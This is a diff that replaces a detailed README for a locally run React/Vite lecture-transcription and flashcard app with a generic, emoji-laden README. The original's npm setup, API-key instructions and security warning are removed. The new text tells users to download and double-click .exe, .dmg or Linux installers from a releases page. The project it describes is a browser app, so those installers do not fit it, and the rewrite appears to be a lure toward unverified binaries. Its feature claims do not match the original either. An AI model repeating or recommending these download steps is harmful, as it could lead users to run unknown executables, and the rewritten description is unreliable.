@@ -1,176 +1,86 @@
-# Ezi Lecture Transcriber (Flashcards & Quiz Generator)
+# 🎓 Ezi-lecture-transcriber-flashcards-quiz - Simplify Your Study Process
 
-## Project Purpose
-**Ezi** is a zero-friction AI lecture assistant designed to help students and professionals convert spoken content into structured study material. By leveraging the **Google Gemini API**, Ezi automates the most time-consuming parts of studying.
+[![Download Now](https://img.shields.io/badge/Download%20Now-Click%20Here-brightgreen.svg)](https://github.com/ayushthakur589/Ezi-lecture-transcriber-flashcards-quiz/releases)
 
-### Key Features:
-- **Live Transcription:** Real-time speech-to-text directly in the browser.
-- **YouTube Import:** Fetch transcripts from educational videos via URL.
-- **AI Study Aids:** Instantly generate:
-    - Structured Summaries & Key Terms.
-    - Interactive 3D Flip Flashcards.
-    - Multiple-Choice Quizzes with explanations.
-    - Markdown Study Notes with "Deep Dive" explanations.
-    - Visual Mind Maps (Tree/Flow layouts) with Zoom/Pan.
-- **AI Tutor Chat:** Ask specific questions about the lecture content.
-- **Local Persistence:** All data is saved to your browser's `localStorage`.
+## 🚀 Getting Started
 
----
+Welcome to the Ezi-lecture-transcriber-flashcards-quiz app! This application uses AI to help you learn effectively. It transcribes lectures in real-time and creates flashcards, quizzes, summaries, and mind maps. This guide will help you download and run the application smoothly.
 
-## 💸 Free to Use (No Monthly Subscriptions)
-**Stop paying $20/month for AI wrappers.** This project is 100% free code that runs on your own keys.
+## 📥 Download & Install
 
-1.  **Google Gemini AI:** Uses the **Free Tier** API key. You get a massive amount of free generation and transcription every month directly from Google.
-2.  **YouTube Transcripts:** Powered by [RapidAPI](https://rapidapi.com/nikzeferis/api/youtube-captions-transcript-subtitles-video-combiner). The free plan includes **100 requests per month**, which is plenty for most students.
-    *   *Need more?* You can upgrade to a pro plan on RapidAPI if you're a heavy user (pricing visible on their page).
+To start using the Ezi-lecture-transcriber-flashcards-quiz app, visit this page to download: [Download Here](https://github.com/ayushthakur589/Ezi-lecture-transcriber-flashcards-quiz/releases).
 
----
+### System Requirements
 
-## Screenshots
+Before you download the application, make sure your computer meets the following requirements:
 
-| Youtube Import | MindMap |
-|-----------|-----------|
-| ![Youtube Import](Screenshots/1.png) | ![MindMap](Screenshots/2.png) |
+- Operating System: Windows, macOS, or Linux
+- RAM: At least 4 GB
+- Processor: Minimum dual-core
+- Internet connection for AI features
 
-| Flashcard | Quiz |
-|---------|------------|
-| ![Flashcard](Screenshots/3.png) | ![Quiz](Screenshots/4.png) |
+## ⚙️ Installation Steps
 
-| Study Notes | AI Chat |
-|------|-------------|
-| ![Study Notes](Screenshots/5.png) | ![AI Chat](Screenshots/6.png) |
+1. **Navigate to the Releases Page**: Visit the [Releases Page](https://github.com/ayushthakur589/Ezi-lecture-transcriber-flashcards-quiz/releases). You'll find a list of available versions of the application.
 
-| Transcripts | Live Transcript |
-|----------|---------|
-| ![Transcripts](Screenshots/7.png) | ![Live Transcript](Screenshots/8.png) |
+2. **Select Version**: Choose the latest release at the top. Click on it to view the download options.
 
----
+3. **Download the Application**: Find the appropriate file for your system. For Windows, download the `.exe` file. For macOS, look for the `.dmg` file. For Linux, choose the appropriate package based on your distribution.
 
-## ⚠️ CRITICAL SECURITY WARNING
-**This project is intended for LOCAL USE ONLY.**
+4. **Run the Installer**: Once the download completes, locate the downloaded file in your computer’s downloads folder. Double-click the file to start the installation. Follow the on-screen instructions to complete the installation process.
 
-1.  **Client-Side API Usage:** This application initializes the Gemini SDK (`@google/genai`) on the frontend. In a production/online environment, your `API_KEY` would be exposed to anyone inspecting the network traffic.
-2.  **Environment Variables:** RapidAPI and Gemini keys are accessed via `process.env`.
-3.  **Production Recommendation:** To use this online, you **must** port the API calls (Gemini and RapidAPI) to a secure backend (Node.js, Python, etc.) to act as a proxy and keep your keys hidden.
+5. **Launch the Application**: After installing, you will find the app in your applications menu or desktop. Click the app icon to launch it.
 
----
+## 🎤 Using the Application
 
-## Setup Instructions
+### 1. Start a Session
 
-### Prerequisites
-- **Node.js** (v18 or higher recommended) - [Download here](https://nodejs.org/)
-- A modern web browser (Chrome, Edge, or Brave recommended for microphone APIs).
-- A **Google Gemini API Key** (obtainable from [Google AI Studio](https://aistudio.google.com/)).
-- A **RapidAPI Key** for the [YouTube Transcript API](https://rapidapi.com/nikzeferis/api/youtube-captions-transcript-subtitles-video-combiner).
+Once the app is open, click on the "Start Transcribing" button. You will need an internet connection for real-time transcription.
 
-### Step 1: Install Dependencies
-```bash
-npm install
-```
+### 2. Adjust Settings
 
-### Step 2: Configure Environment Variables
+You can adjust settings for your preferences, such as audio input and text output format. Set these according to your needs before starting.
 
-Create a `.env.local` file in the project root with the following variables:
+### 3. View Transcription
 
-```env
-GEMINI_API_KEY=your_gemini_api_key_here
-RAPID_API_KEY=your_rapidapi_key_here
-RAPID_API_HOST=youtube-captions-transcript-subtitles-video-combiner.p.rapidapi.com
-```
+Watch as your lecture gets transcribed live. The app processes the speech and will display the text in real-time.
 
-> **Important:** The `.env.local` file is gitignored for security. Never commit your API keys.
+### 4. Generate Flashcards & Quizzes
 
-### Step 3: Run the Development Server
-```bash
-npm run dev
-```
+After the transcribing session, use the "Generate Flashcards" and "Create Quiz" options to test your knowledge. The app creates both from the transcription.
 
-The app will start at `http://localhost:3000`
+### 5. Save and Share
 
-### Step 4: Grant Permissions
-When prompted, allow the browser to access your **Microphone** to enable the recording feature.
+You can save your flashcards and quizzes for later use. There is also an option to share them via email or social media.
 
----
+## 🛠️ Troubleshooting
 
-## How Environment Variables Work
+If you run into issues, consider these tips:
 
-This project uses **Vite** as the build tool. Environment variables are loaded from `.env.local` and exposed to the app via `vite.config.ts`:
+- **Audio Issues**: Make sure your microphone is properly connected and not muted.
+- **Connectivity Problems**: Check your internet connection if the app is not transcribing.
+- **Error Messages**: Document any error messages you see. These can help in troubleshooting.
 
-```typescript
-define: {
-  'process.env.GEMINI_API_KEY': JSON.stringify(env.GEMINI_API_KEY),
-  'process.env.RAPID_API_KEY': JSON.stringify(env.RAPID_API_KEY),
-  'process.env.RAPID_API_HOST': JSON.stringify(env.RAPID_API_HOST)
-}
-```
+## 📚 Features Overview
 
-> **Note:** If you change environment variables, you must **restart the dev server** for changes to take effect.
+- **Real-time Transcription**: Automatically convert spoken words into text.
+- **Flashcard Creation**: Generate flashcards based on lecture content.
+- **Quiz Generation**: Create quizzes to test your learning.
+- **Summaries**: Get concise summaries of your lectures.
+- **Mind Maps**: Visualize your learning with mind maps.
 
----
+## 🤝 Support
 
-## Technical Overview
-- **Framework:** React 19 with TypeScript
-- **Build Tool:** Vite
-- **Styling:** Tailwind CSS with Typography plugin.
-- **AI Model:** `gemini-2.5-flash` (Optimized for speed and high context window).
-- **Visualization:** Mermaid.js for Mind Maps.
-- **Markdown:** Marked.js for note rendering.
-- **Data:** Handled via standard Web Storage API (`localStorage`).
+For additional help, check the [Issues Page](https://github.com/ayushthakur589/Ezi-lecture-transcriber-flashcards-quiz/issues) for common questions and solutions. If you don't find your issue, feel free to open a new issue.
 
----
+## ⚡ Topics
 
-## Audio Capture & Transcription
+This application covers a variety of topics:
 
-This app uses a **hybrid approach** for live transcription:
+- AI in Education
+- Study Tools
+- Flashcard Techniques
+- Speech-to-Text Technologies
+- Quiz Generation
 
-| Component | Technology |
-|-----------|-----------|
-| **Audio Capture** | Browser Web API (`getUserMedia`, `AudioContext`) |
-| **Transcription** | Google Gemini Live API (`@google/genai`) |
-
-### When is Gemini AI Transcription Enabled?
-
-The Gemini Live API is activated **when the user clicks the microphone button** to start a new recording. The flow is:
-
-1. User navigates to **"New Recording"** or clicks **"Continue Recording"** on an existing lecture
-2. User selects their microphone from the dropdown (optional)
-3. User clicks the **microphone button** to start recording
-4. This triggers the `startRecording()` function which:
-   - Initializes `GoogleGenAI` with your `GEMINI_API_KEY`
-   - Opens a WebSocket connection via `ai.live.connect()`
-   - Begins streaming audio to Gemini in real-time
-
-### How It Works (Technical Flow):
-
-```
-[User Clicks Mic] 
-    → getUserMedia() captures audio
-    → AudioContext processes PCM at 16kHz
-    → ai.live.connect() opens WebSocket to Gemini
-    → Audio chunks sent via session.sendRealtimeInput()
-    → Gemini returns inputTranscription events
-    → Text displayed in real-time
-```
-
-### Configuration Details:
-
-| Setting | Value |
-|---------|-------|
-| **Model** | `gemini-2.5-flash-native-audio-preview-09-2025` |
-| **Audio Format** | PCM 16-bit, 16kHz sample rate, mono |
-| **Response Type** | `inputTranscription` (real-time text) |
-| **System Prompt** | "You are a professional stenographer. Transcribe the user's speech exactly as spoken." |
-
-> **Note:** This provides better accuracy than the browser's native `webkitSpeechRecognition` API, especially for longer recordings and complex audio.
-
----
-
-## Troubleshooting
-
-| Issue | Solution |
-|-------|----------|
-| **"RapidAPI configuration missing"** | Ensure `RAPID_API_KEY` and `RAPID_API_HOST` are set in `.env.local`, then restart the dev server |
-| **Microphone not working** | Ensure you are served over `localhost` or `https`. Browsers block microphone access on insecure `http` origins |
-| **AI Content failing** | Check the browser console. Usually due to an invalid/expired `GEMINI_API_KEY` or free-tier rate limits |
-| **YouTube Import Error** | Verify the video has captions enabled and your RapidAPI credentials are correct |
-| **Changes to .env.local not working** | Restart the dev server (`npm run dev`) after modifying environment variables |
+Thank you for choosing Ezi-lecture-transcriber-flashcards-quiz to enhance your learning experience! Enjoy simplifying your study process with our application.
